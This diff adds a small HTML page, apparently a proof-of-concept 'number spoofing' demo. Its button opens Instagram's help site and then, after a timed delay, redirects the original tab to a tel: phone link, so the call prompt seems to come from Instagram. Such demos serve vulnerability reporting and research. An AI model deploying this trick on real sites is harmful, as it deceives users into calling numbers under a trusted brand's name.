@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Number Spoofing Demo</title>
+  </head>
+  <body>
+    <h2>Click Here</h2>
+    <input 
+      type="button" 
+      value="Click here" 
+      onclick="
+        setTimeout(function() {
+          window.open('https://help.instagram.com/');
+        }, 123);
+
+        setTimeout(function() {
+          document.location = 'tel:+2123232';
+        }, 723);
+      "
+    >
+  </body>
+</html>
